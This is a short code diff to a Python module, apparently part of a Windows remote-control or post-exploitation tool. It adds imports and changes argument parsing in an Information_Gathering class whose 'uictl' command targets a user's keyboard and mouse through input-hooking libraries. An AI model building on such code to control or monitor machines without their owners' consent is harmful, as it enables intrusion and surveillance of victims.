@@ -15,6 +15,8 @@ from getpass import getpass
 import pyHook
 import pythoncom
 import win32api
+import win32con
+import logging
 from common import *
 
 class Information_Gathering:
@@ -374,7 +376,7 @@ class Information_Gathering:
 		
 	@windows_only
 	def uictl(self, a):
-		action, what = a
+		action, what = a.split()
 		what = what.lower()
 		action = action.lower()
 		if what not in ["keyboard","mouse"]: return "[-]Unknown object: "+what
